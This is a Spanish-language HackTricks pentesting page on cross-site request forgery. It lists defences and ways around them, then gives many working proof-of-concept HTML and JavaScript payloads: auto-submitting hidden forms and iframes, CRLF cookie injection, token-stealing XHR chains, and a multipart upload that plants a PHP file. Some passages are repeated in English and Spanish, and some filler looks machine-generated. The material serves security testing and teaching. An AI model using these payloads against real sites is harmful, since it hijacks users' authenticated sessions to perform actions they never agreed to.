# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptograf√≠a.**

**Obt√©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendr√°s la recompensa despu√©s de que se verifique el error.

**Obt√©n experiencia en pentesting web3**\
¬°Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus d√≠as de crecimiento.

**Convi√©rtete en la leyenda del hacker web3**\
Gana puntos de reputaci√≥n con cada error verificado y conquista la cima de la clasificaci√≥n semanal.

[**Reg√≠strate en HackenProof**](https://hackenproof.com/register) ¬°comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

## ¬øQu√© es CSRF?

**Cross-site request forgery** (tambi√©n conocido como CSRF) es una vulnerabilidad de seguridad web que permite a un atacante **inducir a los usuarios a realizar acciones que no desean realizar**.\
Esto se logra **haciendo que un usuario con sesi√≥n iniciada** en la plataforma v√≠ctima acceda a un sitio web controlado por el atacante y desde all√≠ **ejecute** c√≥digo JS malicioso, env√≠e formularios o recupere "im√°genes" en la **cuenta de la v√≠ctima**.

### Requisitos

Para poder aprovechar una vulnerabilidad de CSRF, primero debes **encontrar una acci√≥n relevante para abusar** (cambiar la contrase√±a o el correo electr√≥nico, hacer que la v√≠ctima te siga en una red social, darte m√°s privilegios...). La **sesi√≥n debe depender solo de cookies o del encabezado de autenticaci√≥n b√°sica HTTP**, no se puede usar ning√∫n otro encabezado para manejar la sesi√≥n. Y finalmente, no debe haber **par√°metros impredecibles** en la solicitud.

Se pueden implementar varias **contramedidas** para evitar esta vulnerabilidad.

### **Defensas comunes**

* [**Cookies SameSite**](hacking-with-cookies/#samesite): Si la cookie de sesi√≥n utiliza esta bandera, es posible que no puedas enviar la cookie desde sitios web arbitrarios.
* [**Compartici√≥n de recursos entre or√≠genes**](cors-bypass.md): Dependiendo del tipo de solicitud HTTP que necesites realizar para abusar de la acci√≥n relevante, debes tener en cuenta la **pol√≠tica CORS del sitio v√≠ctima**. _Ten en cuenta que la pol√≠tica CORS no afectar√° si solo quieres enviar una solicitud GET o una solicitud POST desde un formulario y no necesitas leer la respuesta._
* Solicitar la **contrase√±a** del usuario para autorizar la acci√≥n.
* Resolver un **captcha**
* Leer los encabezados **Referrer** u **Origin**. Si se utiliza una expresi√≥n regular, se puede eludir, por ejemplo, con:
* http://mal.net?orig=http://example.com (termina con la URL)
* http://example.com.mal.net (comienza con la URL)
* **Modificar** el **nombre** de los **par√°metros** de la solicitud POST o GET
* Usar un **token CSRF** en cada sesi√≥n. Este token debe enviarse dentro de la solicitud para confirmar la acci√≥n. Este token puede estar protegido con CORS.

### Mapa de CSRF

![](<../.gitbook/assets/image (112).png>)

## Bypass de defensas

### De POST a GET

Tal vez el formulario que deseas aprovechar est√° preparado para enviar una **solicitud POST con un token CSRF**, pero debes **verificar** si tambi√©n es **v√°lido** enviar una solicitud GET y si se sigue **validando el token CSRF** cuando se env√≠a una solicitud GET.

### Falta de token

Algunas aplicaciones **validan correctamente el token cuando est√° presente pero omiten la validaci√≥n si se omite el token**.\
En esta situaci√≥n, el atacante puede **eliminar el par√°metro completo** que contiene el token (no solo su valor) para eludir la validaci√≥n y realizar un ataque CSRF.

### El token CSRF no est√° vinculado a la sesi√≥n del usuario

Algunas aplicaciones **no validan que el token pertenezca a la misma sesi√≥n** que el usuario que realiza la solicitud. En cambio, la aplicaci√≥n **mantiene un conjunto global de tokens** que ha emitido y acepta cualquier token que aparezca en este conjunto.\
En esta situaci√≥n, el atacante puede iniciar sesi√≥n en la aplicaci√≥n utilizando su propia cuenta, **obtener un token v√°lido** y luego **proporcionar ese token al usuario v√≠ctima** en su ataque CSRF.

### Bypass de m√©todo

Si la solicitud utiliza un **m√©todo "extra√±o"**, verifica si la **funcionalidad de anulaci√≥n de m√©todo** est√° funcionando.\
Por ejemplo, si se est√° utilizando un m√©todo **PUT**, puedes intentar **usar un m√©todo POST** y **enviar**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Esto tambi√©n puede funcionar enviando el **par√°metro \_method dentro de una solicitud POST** o utilizando los **encabezados**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### Bypass personalizado de token de encabezado

Si la solicitud est√° agregando un **encabezado personalizado** con un **token** a la solicitud como m√©todo de protecci√≥n contra CSRF, entonces:

* Prueba la solicitud sin el **Token personalizado y tambi√©n el encabezado**.
* Prueba la solicitud con un **token diferente pero de la misma longitud**.

### El token CSRF se verifica mediante una cookie

En una variaci√≥n adicional de la vulnerabilidad anterior, algunas aplicaciones **duplican cada token dentro de una cookie y un par√°metro de solicitud**. O **configuran una cookie CSRF** y **verifican en el backend si el token CSRF enviado es el relacionado con la cookie**.

Cuando se valida la solicitud posterior, la aplicaci√≥n simplemente verifica que el **token** enviado en el **par√°metro de solicitud coincida** con el valor almacenado por la **cookie**.\
En esta situaci√≥n, el atacante puede nuevamente realizar un ataque CSRF **si el sitio web contiene alguna vulnerabilidad que le permita configurar su cookie CSRF en la v√≠ctima como un CRLF**.

En este caso, puedes configurar la cookie intentando cargar una imagen falsa y luego lanzar el ataque CSRF como en este ejemplo:
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
Ten en cuenta que si el **token csrf est√° relacionado con la cookie de sesi√≥n, este ataque no funcionar√°** porque necesitar√°s establecerle a la v√≠ctima tu sesi√≥n, y por lo tanto estar√°s atac√°ndote a ti mismo.
{% endhint %}

### Cambio de Content-Type

Seg√∫n [**esto**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), para **evitar las solicitudes de preflight** utilizando el m√©todo **POST**, estos son los valores permitidos para Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Sin embargo, ten en cuenta que la **l√≥gica del servidor puede variar** dependiendo del **Content-Type** utilizado, por lo que debes probar los valores mencionados y otros como **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Ejemplo (de [aqu√≠](https://brycec.me/posts/corctf\_2021\_challenges)) de env√≠o de datos JSON como text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Bypass de solicitud de preflight de tipo de contenido application/json

Como ya sabes, no puedes enviar una solicitud POST con el tipo de contenido **`application/json`** a trav√©s de un formulario HTML, y si intentas hacerlo a trav√©s de **`XMLHttpRequest`**, primero se env√≠a una solicitud de preflight.\
Sin embargo, podr√≠as intentar enviar los datos JSON utilizando los tipos de contenido **`text/plain`** y **`application/x-www-form-urlencoded`** solo para comprobar si el backend est√° utilizando los datos independientemente del tipo de contenido.\
Puedes enviar un formulario utilizando `Content-Type: text/plain` estableciendo **`enctype="text/plain"`**

Si el servidor solo acepta el tipo de contenido "application/json", puedes **enviar el tipo de contenido "text/plain; application/json"** sin activar una solicitud de preflight.

Tambi√©n podr√≠as intentar **burlar** esta restricci√≥n utilizando un archivo flash **SWF**. Para obtener m√°s informaci√≥n, [**lee este art√≠culo**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Bypass de verificaci√≥n de Referer / Origin

**Evita el encabezado Referer**

Algunas aplicaciones validan el encabezado Referer cuando est√° presente en las solicitudes, pero **omitir√°n la validaci√≥n si el encabezado se omite**.
```markup
<meta name="referrer" content="never">
```
**Bypasses de Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Para establecer el nombre de dominio del servidor en la URL que el Referrer va a enviar dentro de los par√°metros, puedes hacer lo siguiente:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptograf√≠a.**

**Obt√©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendr√°s la recompensa despu√©s de que se verifique el error.

**Obt√©n experiencia en pentesting web3**\
¬°Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus d√≠as de crecimiento.

**Convi√©rtete en la leyenda del hacker web3**\
Gana puntos de reputaci√≥n con cada error verificado y conquista la cima de la clasificaci√≥n semanal.

[**Reg√≠strate en HackenProof**](https://hackenproof.com/register) ¬°comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

## **Ejemplos de explotaci√≥n**

### **Exfiltrando el token CSRF**

Si se est√° utilizando un **token CSRF** como **defensa**, puedes intentar **exfiltrarlo** abusando de una vulnerabilidad de [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) o una vulnerabilidad de [**Dangling Markup**](dangling-markup-html-scriptless-injection.md).

### **GET utilizando etiquetas HTML**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Otras etiquetas HTML5 que se pueden utilizar para enviar autom√°ticamente una solicitud GET son:

![](<../.gitbook/assets/image (530).png>)

### Solicitud GET de formulario
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Solicitud de env√≠o de formulario

A common method used to submit data to a web server is through a form POST request. This type of request is typically used when submitting sensitive information, such as login credentials or payment details. 

Un m√©todo com√∫n utilizado para enviar datos a un servidor web es a trav√©s de una solicitud de env√≠o de formulario (form POST request). Este tipo de solicitud se utiliza generalmente al enviar informaci√≥n sensible, como credenciales de inicio de sesi√≥n o detalles de pago.

To make a form POST request, the client sends an HTTP POST request to the server with the form data included in the request body. The server then processes the data and responds accordingly. 

Para realizar una solicitud de env√≠o de formulario, el cliente env√≠a una solicitud HTTP POST al servidor con los datos del formulario incluidos en el cuerpo de la solicitud. Luego, el servidor procesa los datos y responde en consecuencia.

In a typical scenario, the server generates a unique token, known as a CSRF token, and includes it in the form as a hidden field. When the form is submitted, the CSRF token is also sent along with the other form data. 

En un escenario t√≠pico, el servidor genera un token √∫nico, conocido como token CSRF, y lo incluye en el formulario como un campo oculto. Cuando se env√≠a el formulario, el token CSRF tambi√©n se env√≠a junto con los dem√°s datos del formulario.

The server validates the CSRF token to ensure that the request is legitimate and not a result of a cross-site request forgery (CSRF) attack. If the CSRF token is missing or invalid, the server rejects the request. 

El servidor valida el token CSRF para asegurarse de que la solicitud sea leg√≠tima y no sea el resultado de un ataque de falsificaci√≥n de solicitud entre sitios (CSRF). Si el token CSRF est√° ausente o es inv√°lido, el servidor rechaza la solicitud.

By including a CSRF token in the form, the server can protect against CSRF attacks by verifying that the request originated from the same website. This helps prevent malicious actors from tricking users into submitting unauthorized requests. 

Al incluir un token CSRF en el formulario, el servidor puede protegerse contra ataques CSRF verificando que la solicitud se origin√≥ en el mismo sitio web. Esto ayuda a prevenir que actores maliciosos enga√±en a los usuarios para que env√≠en solicitudes no autorizadas.

It is important for developers to implement CSRF protection measures in their web applications to ensure the security of user data and prevent unauthorized actions.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Solicitud de env√≠o de formulario a trav√©s de un iframe

One common technique used in Cross-Site Request Forgery (CSRF) attacks is to submit a form through an iframe. This technique allows an attacker to trick a user into unknowingly submitting a form on a targeted website.

To execute this attack, the attacker creates a malicious webpage that contains an iframe pointing to the target website's form submission URL. The attacker then lures the victim into visiting the malicious webpage.

When the victim visits the malicious webpage, the iframe automatically submits the form on the target website, using the victim's authenticated session. Since the victim is already logged in to the target website, the form submission appears legitimate to the server.

This technique can be particularly effective when combined with social engineering tactics, such as sending the victim a link to the malicious webpage via email or a messaging platform.

To protect against this type of attack, web developers should implement measures such as:

- Implementing anti-CSRF tokens: By including a unique token in each form submission, developers can ensure that the form is only submitted from their own website and not from a malicious source.
- Implementing SameSite cookies: By setting the SameSite attribute to "Strict" or "Lax" for cookies, developers can prevent them from being sent in cross-origin requests, thereby mitigating the risk of CSRF attacks.
- Implementing strong authentication and session management: By enforcing strong authentication mechanisms and properly managing user sessions, developers can reduce the risk of unauthorized form submissions.

By understanding and implementing these security measures, web developers can effectively protect their websites against CSRF attacks executed through iframes.
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Solicitud POST de Ajax**

En una aplicaci√≥n web, las solicitudes Ajax se utilizan com√∫nmente para enviar y recibir datos del servidor sin tener que recargar la p√°gina. Esto se logra mediante el uso de la funci√≥n `XMLHttpRequest` en JavaScript para enviar solicitudes HTTP asincr√≥nicas.

Una solicitud POST de Ajax se utiliza para enviar datos al servidor. En lugar de utilizar el m√©todo GET, que coloca los datos en la URL, el m√©todo POST env√≠a los datos en el cuerpo de la solicitud HTTP.

Aqu√≠ hay un ejemplo de c√≥mo se puede realizar una solicitud POST de Ajax utilizando JavaScript:

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "/endpoint", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    console.log(xhr.responseText);
  }
};
var data = {
  username: "usuario",
  password: "contrase√±a"
};
xhr.send(JSON.stringify(data));
```

En este ejemplo, se crea un objeto `XMLHttpRequest` y se abre una conexi√≥n POST con el servidor en la URL "/endpoint". Luego, se establece el encabezado "Content-Type" en "application/json" para indicar que los datos se enviar√°n en formato JSON.

El evento `onreadystatechange` se utiliza para manejar la respuesta del servidor. Si el estado de la solicitud es 4 (completado) y el estado HTTP es 200 (√©xito), se muestra la respuesta del servidor en la consola.

Los datos que se enviar√°n al servidor se definen en el objeto `data`. En este caso, se env√≠a un objeto JSON con las propiedades "username" y "password".

Al utilizar solicitudes POST de Ajax, es importante tener en cuenta la protecci√≥n contra ataques CSRF (Cross-Site Request Forgery). CSRF es un tipo de ataque en el que un atacante enga√±a a un usuario para que realice una acci√≥n no deseada en un sitio web en el que el usuario est√° autenticado.

Para protegerse contra CSRF, se pueden implementar medidas como el uso de tokens CSRF, que son valores √∫nicos generados por el servidor y se incluyen en cada solicitud. El servidor verifica que el token sea v√°lido antes de procesar la solicitud. Esto ayuda a garantizar que las solicitudes solo se realicen desde el sitio web leg√≠timo y no desde un sitio malicioso.
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Solicitud POST multipart/form-data

When submitting a form on a website, the data is typically sent using the `application/x-www-form-urlencoded` content type. However, in some cases, the form may require the use of the `multipart/form-data` content type.

The `multipart/form-data` content type is commonly used when uploading files or when the form contains binary data. This content type allows the data to be divided into multiple parts, each with its own set of headers.

To craft a `multipart/form-data` POST request, you need to include the appropriate headers and format the data correctly. Here's an example of what the request might look like:

```http
POST /submit-form HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="username"

john.doe
-----------------------------1234567890
Content-Disposition: form-data; name="profile_picture"; filename="picture.jpg"
Content-Type: image/jpeg

[Binary data of the image]
-----------------------------1234567890--
```

In the example above, the request starts with the usual HTTP headers, including the `Content-Type` header specifying the `multipart/form-data` content type. The `boundary` parameter is used to separate the different parts of the request.

Each part of the request starts with a boundary line, followed by the headers specific to that part. In this example, there are two parts: one for the `username` field and another for the `profile_picture` field. The `Content-Disposition` header specifies the name of the field, and in the case of the `profile_picture` field, it also includes the filename.

After the headers, the actual data is included. For text fields like `username`, the data is simply the field value. For file uploads, the data is the binary content of the file.

Finally, the request ends with a boundary line followed by two hyphens (`--`) to indicate the end of the request.

By understanding how to craft a `multipart/form-data` POST request, you can effectively interact with web forms that require this content type, including those that involve file uploads.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Solicitud POST multipart/form-data v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request. This technique is commonly used to exploit web applications that do not implement proper CSRF protection.

En esta t√©cnica, exploraremos c√≥mo realizar un ataque de falsificaci√≥n de solicitud entre sitios (CSRF) utilizando una solicitud POST multipart/form-data. Esta t√©cnica se utiliza com√∫nmente para explotar aplicaciones web que no implementan una protecci√≥n adecuada contra CSRF.

#### Overview

The multipart/form-data content type is commonly used for file uploads and form submissions that contain binary data. It allows the client to send multiple parts of data in a single request.

El tipo de contenido multipart/form-data se utiliza com√∫nmente para cargar archivos y enviar formularios que contienen datos binarios. Permite al cliente enviar varias partes de datos en una sola solicitud.

#### Exploiting CSRF using multipart/form-data

To exploit CSRF using a multipart/form-data POST request, we need to create a form that submits the desired request to the target application. This form should include all the necessary fields and values required by the target application.

Para explotar CSRF utilizando una solicitud POST multipart/form-data, debemos crear un formulario que env√≠e la solicitud deseada a la aplicaci√≥n objetivo. Este formulario debe incluir todos los campos y valores necesarios requeridos por la aplicaci√≥n objetivo.

Once the form is created, we can host it on a website under our control. We can then trick the victim into visiting this website, which will automatically submit the form in the background without their knowledge.

Una vez creado el formulario, podemos alojarlo en un sitio web bajo nuestro control. Luego, podemos enga√±ar a la v√≠ctima para que visite este sitio web, lo que enviar√° autom√°ticamente el formulario en segundo plano sin su conocimiento.

When the victim visits our website, the form will be submitted to the target application using their authenticated session. This allows us to perform actions on behalf of the victim without their consent.

Cuando la v√≠ctima visita nuestro sitio web, el formulario se enviar√° a la aplicaci√≥n objetivo utilizando su sesi√≥n autenticada. Esto nos permite realizar acciones en nombre de la v√≠ctima sin su consentimiento.

#### Conclusion

Exploiting CSRF vulnerabilities using multipart/form-data POST requests can be a powerful technique in a hacker's arsenal. It allows attackers to perform unauthorized actions on behalf of unsuspecting victims. Therefore, it is crucial for web applications to implement proper CSRF protection mechanisms to prevent such attacks.

Explotar vulnerabilidades de CSRF utilizando solicitudes POST multipart/form-data puede ser una t√©cnica poderosa en el arsenal de un hacker. Permite a los atacantes realizar acciones no autorizadas en nombre de v√≠ctimas desprevenidas. Por lo tanto, es crucial que las aplicaciones web implementen mecanismos adecuados de protecci√≥n contra CSRF para prevenir este tipo de ataques.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Solicitud POST de formulario desde un iframe

When an HTML form is submitted, the browser sends a POST request to the server with the form data. This can be exploited in a Cross-Site Request Forgery (CSRF) attack by tricking a user into submitting a form without their knowledge or consent.

Cuando se env√≠a un formulario HTML, el navegador env√≠a una solicitud POST al servidor con los datos del formulario. Esto puede ser explotado en un ataque de falsificaci√≥n de solicitud entre sitios (CSRF) al enga√±ar a un usuario para que env√≠e un formulario sin su conocimiento o consentimiento.

To perform a CSRF attack using an iframe, an attacker can create a webpage with an invisible iframe that loads a target website containing a vulnerable form. The attacker can then use JavaScript to automatically submit the form within the iframe, sending the POST request to the target website.

Para realizar un ataque CSRF utilizando un iframe, un atacante puede crear una p√°gina web con un iframe invisible que cargue un sitio web objetivo que contenga un formulario vulnerable. Luego, el atacante puede usar JavaScript para enviar autom√°ticamente el formulario dentro del iframe, enviando la solicitud POST al sitio web objetivo.

The victim, who is logged into the target website, visits the attacker's webpage. Since the iframe is invisible, the victim is unaware that their browser is submitting a form on their behalf. The POST request is sent with the victim's session cookies, allowing the attacker to perform actions on behalf of the victim.

La v√≠ctima, que ha iniciado sesi√≥n en el sitio web objetivo, visita la p√°gina web del atacante. Dado que el iframe es invisible, la v√≠ctima no se da cuenta de que su navegador est√° enviando un formulario en su nombre. La solicitud POST se env√≠a con las cookies de sesi√≥n de la v√≠ctima, lo que permite al atacante realizar acciones en nombre de la v√≠ctima.

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, which are unique tokens embedded in forms to verify the authenticity of the request. Additionally, web browsers can implement same-origin policies to restrict the execution of scripts within iframes.

Para protegerse contra ataques CSRF, los desarrolladores web deben implementar medidas como el uso de tokens anti-CSRF, que son tokens √∫nicos incrustados en formularios para verificar la autenticidad de la solicitud. Adem√°s, los navegadores web pueden implementar pol√≠ticas de mismo origen para restringir la ejecuci√≥n de scripts dentro de iframes.
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Robar el token CSRF y enviar una solicitud POST**

En un ataque de falsificaci√≥n de solicitud entre sitios (CSRF), el objetivo es enga√±ar al usuario para que realice una acci√≥n no deseada en un sitio web en el que ya est√° autenticado. Para llevar a cabo este ataque, es necesario robar el token CSRF del usuario y luego enviar una solicitud POST utilizando ese token.

Aqu√≠ hay un ejemplo de c√≥mo se puede realizar este ataque:

1. Obtener el token CSRF: El token CSRF se encuentra generalmente en una cookie o en una etiqueta oculta en el formulario. Utilizando t√©cnicas de ingenier√≠a social o de inyecci√≥n de c√≥digo, se puede obtener este token del usuario.

2. Crear una solicitud POST: Una vez que se ha obtenido el token CSRF, se puede utilizar para crear una solicitud POST falsa. Esta solicitud puede contener cualquier acci√≥n no deseada, como cambiar la contrase√±a del usuario o realizar una compra no autorizada.

3. Enviar la solicitud POST: La solicitud POST falsa se env√≠a al servidor web objetivo. Dado que la solicitud contiene el token CSRF v√°lido, el servidor la considerar√° leg√≠tima y realizar√° la acci√≥n solicitada.

Es importante tener en cuenta que este ataque solo es exitoso si el usuario est√° autenticado en el sitio web objetivo y si el sitio no implementa medidas de protecci√≥n adecuadas, como la verificaci√≥n del origen de las solicitudes.

Para protegerse contra los ataques CSRF, los desarrolladores deben implementar medidas de seguridad, como el uso de tokens CSRF que sean √∫nicos y aleatorios para cada sesi√≥n y la verificaci√≥n del origen de las solicitudes. Los usuarios tambi√©n deben ser conscientes de los posibles riesgos y evitar hacer clic en enlaces sospechosos o abrir archivos adjuntos de fuentes no confiables.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Robar el token CSRF y enviar una solicitud POST utilizando un iframe, un formulario y Ajax**

El robo de tokens CSRF es una t√©cnica com√∫n utilizada en ataques de falsificaci√≥n de solicitudes entre sitios. Esta t√©cnica aprovecha la confianza que un sitio web tiene en el navegador del usuario para realizar acciones no deseadas en nombre del usuario.

Para robar el token CSRF, se puede utilizar un iframe oculto que cargue la p√°gina objetivo que contiene el token. Luego, se puede acceder al contenido del iframe y extraer el valor del token.

```html
<iframe id="csrf-frame" src="https://www.sitio-objetivo.com" style="display: none;"></iframe>
<script>
    var csrfFrame = document.getElementById('csrf-frame');
    var csrfToken = csrfFrame.contentDocument.querySelector('input[name="csrf_token"]').value;
    // Aqu√≠ se puede enviar el token a un servidor malicioso o realizar otras acciones no deseadas
</script>
```

Una vez que se ha robado el token CSRF, se puede utilizar para enviar una solicitud POST utilizando un formulario oculto o mediante una solicitud Ajax.

```html
<form id="csrf-form" action="https://www.sitio-objetivo.com/action" method="POST" style="display: none;">
    <input type="hidden" name="csrf_token" value="TOKEN_CSRF_ROBADO">
    <!-- Otros campos del formulario -->
</form>
<script>
    var csrfForm = document.getElementById('csrf-form');
    csrfForm.submit();
</script>
```

Otra opci√≥n es utilizar una solicitud Ajax para enviar la solicitud POST con el token CSRF robado.

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://www.sitio-objetivo.com/action', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('X-CSRF-Token', 'TOKEN_CSRF_ROBADO');
// Aqu√≠ se pueden agregar otros encabezados y datos de la solicitud
xhr.send();
```

